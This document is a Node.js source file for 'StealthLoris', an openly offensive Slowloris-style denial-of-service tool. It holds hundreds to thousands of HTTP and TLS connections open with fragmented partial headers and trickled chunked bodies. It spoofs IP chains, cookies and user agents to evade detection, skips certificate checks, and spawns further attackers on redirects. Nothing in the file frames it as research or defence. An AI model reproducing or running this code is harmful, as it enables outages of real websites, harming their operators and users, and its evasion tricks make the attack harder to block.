import net from 'node:net';
import tls from 'node:tls';
import crypto from 'node:crypto';
import { setTimeout } from 'node:timers/promises';

import UserAgentSmith from 'user-agent-smith';

export default class StealthLoris {
  constructor(url, connections = 500) {
    this.url = new URL(url);
    this.host = this.url.hostname;
    this.port = this.url.port || (this.url.protocol === 'https:' ? 443 : 80);
    this.ssl = this.url.protocol === 'https:';
    this.connections = [];
    this.keepAliveInterval = null;
    this.connectionCount = connections;
    this.isRunning = false;
    this.dynamicTimeout = 10000;
    this.headerTemplates = this.#generateHeaderTemplates();
    this.cookieJar = new Map();
    this.redirectHistory = new Map();
    this.userAgentSmith = new UserAgentSmith();
  }

  #generateHeaderTemplates() {
    const baseHeaders = {
      common: [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'DNT: 1',
        'Upgrade-Insecure-Requests: 1'
      ],
      varying: [
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: none',
        'Sec-Fetch-User: ?1',
        'TE: trailers'
      ]
    };

    return [
      () => [
        `GET ${this.url.pathname}?${crypto.randomBytes(4).toString('hex')} HTTP/1.1`,
        `Host: ${this.host}`,
        `User-Agent: ${this.#getRealisticUserAgent()}`,
        `X-Forwarded-For: ${this.#generateIPChain()}`,
        `Cookie: ${this.#generateCookies()}`,
        ...baseHeaders.common,
        ...(Math.random() > 0.5 ? baseHeaders.varying : []),
        'Connection: keep-alive',
        '\r\n'
      ].join('\r\n'),

      () => [
        `POST ${this.url.pathname} HTTP/1.1`,
        `Host: ${this.host}`,
        `User-Agent: ${this.#getRealisticUserAgent()}`,
        `X-Forwarded-For: ${this.#generateIPChain()}`,
        `Cookie: ${this.#generateCookies()}`,
        'Content-Type: application/x-www-form-urlencoded',
        'Transfer-Encoding: chunked',
        ...baseHeaders.common,
        ...(Math.random() > 0.5 ? baseHeaders.varying : []),
        'Connection: keep-alive',
        '\r\n'
      ].join('\r\n')
    ];
  }

  #getRealisticUserAgent() {
    return this.userAgentSmith.generate();
  }

  #generateIPChain() {
    return `${Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.')}, ` +
      `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }

  #generateCookies() {
    const cookies = [];
    for (let i = 0; i < 3; i++) {
      cookies.push(`${crypto.randomBytes(8).toString('hex')}=${crypto.randomBytes(4).toString('hex')}`);
    }
    return cookies.join('; ');
  }

  async #createConnection() {
    try {
      const socket = this.ssl ? tls.connect({
        host: this.host,
        port: this.port,
        rejectUnauthorized: false,
        servername: this.host,
        ciphers: [
          'TLS_AES_256_GCM_SHA384',
          'TLS_AES_128_GCM_SHA256',
          'TLS_CHACHA20_POLY1305_SHA256',
          'TLS_AES_128_CCM',
          'TLS_AES_128_CCM_8',
        ].join(':'),
        maxVersion: 'TLSv1.3',
        minVersion: 'TLSv1.2'
      }) : new net.Socket();

      if (!this.ssl) {
        await new Promise((resolve, reject) => {
          socket.connect(this.port, this.host, () => {
            console.log(`[+] Connected to ${this.host}:${this.port}`);
            resolve();
          });
          socket.once('error', (err) => {
            console.error(`[!] Connection error: ${err.message}`);
            reject(err);
          });
        });
      }

      const template = this.headerTemplates[Math.floor(Math.random() * this.headerTemplates.length)];
      const headers = template();
      
      const headerChunks = this.#fragmentData(headers);
      for (const chunk of headerChunks) {
        socket.write(chunk);
        await setTimeout(Math.random() * 150);
      }

      socket.on('data', (data) => this.#handleResponse(socket, data));

      return socket;
    } catch (error) {
      console.error(`[!] Failed to create connection: ${error.message}`);
      return null;
    }
  }

  #fragmentData(data) {
    const chunks = [];
    let offset = 0;
    while (offset < data.length) {
      const chunkSize = Math.floor(Math.random() * 64) + 64;
      chunks.push(data.substring(offset, offset + chunkSize));
      offset += chunkSize;
    }
    return chunks;
  }

  #handleResponse(socket, data) {
    const response = data.toString();
    const statusCode = parseInt(response.split(' ')[1]);
    
    if (statusCode >= 300 && statusCode < 400) {
      const location = response.match(/Location: (.*)/i)?.[1];
      if (location) {
        this.redirectHistory.set(socket, new URL(location, this.url.origin));
      }
    }
  }

  async #maintainConnection(socket) {
    try {
      const methods = [
        () => socket.write(`X-${crypto.randomBytes(3).toString('hex')}: ${Math.random().toString(36)}\r\n`),
        () => socket.write(`${crypto.randomBytes(4).toString('hex')}: ${crypto.randomBytes(8).toString('hex')}\r\n`),
        () => socket.write(`\r\n`)
      ];

      const action = methods[Math.floor(Math.random() * methods.length)];
      action();
      
      if (socket.isPost) {
        const chunk = crypto.randomBytes(Math.floor(Math.random() * 128)).toString('hex');
        socket.write(`${chunk.length.toString(16)}\r\n${chunk}\r\n`);
      }

      return true;
    } catch (error) {
      return false;
    }
  }

  async #connectionManager() {
    const activeConnections = this.connections.filter(s => !s.destroyed);
    const needed = this.connectionCount - activeConnections.length;

    if (needed > 0) {
      const batchSize = Math.min(needed, Math.floor(this.connectionCount * 0.1));
      for (let i = 0; i < batchSize; i++) {
        const socket = await this.#createConnection();
        if (socket) {
          socket.isPost = Math.random() > 0.7;
          this.connections.push(socket);
          socket.reconnectDelay = Math.min(30000, 1000 * Math.pow(2, socket.reconnectAttempts || 0));
          await setTimeout(Math.random() * 500);
        }
      }
    }

    this.connections = this.connections.filter(s => {
      if (s.destroyed) {
        if (this.redirectHistory.has(s)) {
          const newUrl = this.redirectHistory.get(s);
          this.redirectHistory.delete(s);
          this.#followRedirect(newUrl);
        }
        return false;
      }
      return true;
    });

    this.#adjustDynamicTimeout();
  }

  #followRedirect(url) {
    const redirectAttacker = new StealthLoris(url.href, Math.floor(this.connectionCount * 0.3));
    redirectAttacker.start();
  }

  #adjustDynamicTimeout() {
    const successRate = this.connections.length / this.connectionCount;
    this.dynamicTimeout = successRate > 0.8 ? 1000 + Math.random() * 1000 :
                          successRate > 0.5 ? 2000 + Math.random() * 2000 :
                          successRate > 0.2 ? 4000 + Math.random() * 3000 : 
                          8000 + Math.random() * 4000;
  }

  async start() {
    this.isRunning = true;
    console.log(`[${new Date().toISOString()}] Initiating polymorphic attack on ${this.host}`);

    const rampUpInterval = setInterval(() => {
      if (this.connections.length >= this.connectionCount) {
        clearInterval(rampUpInterval);
        return;
      }
      this.#connectionManager();
    }, 5000);

    this.keepAliveInterval = setInterval(async () => {
      if (!this.isRunning) return;

      await Promise.all(this.connections.map(async (socket) => {
        if (!await this.#maintainConnection(socket)) {
          socket.destroy();
        } else if (Math.random() < 0.05) {
          socket.destroy();
        }
      }));

      await this.#connectionManager();
    }, this.dynamicTimeout);

    setInterval(() => {
      this.connectionCount = Math.floor(this.connectionCount * (0.8 + Math.random() * 0.4));
      this.connectionCount = Math.min(5000, Math.max(100, this.connectionCount));
    }, 300000);
  }

  stop() {
    this.isRunning = false;
    clearInterval(this.keepAliveInterval);
    this.connections.forEach(socket => socket.destroy());
    console.log(`Attack terminated. Residual connections: ${this.connections.length}`);
  }
}
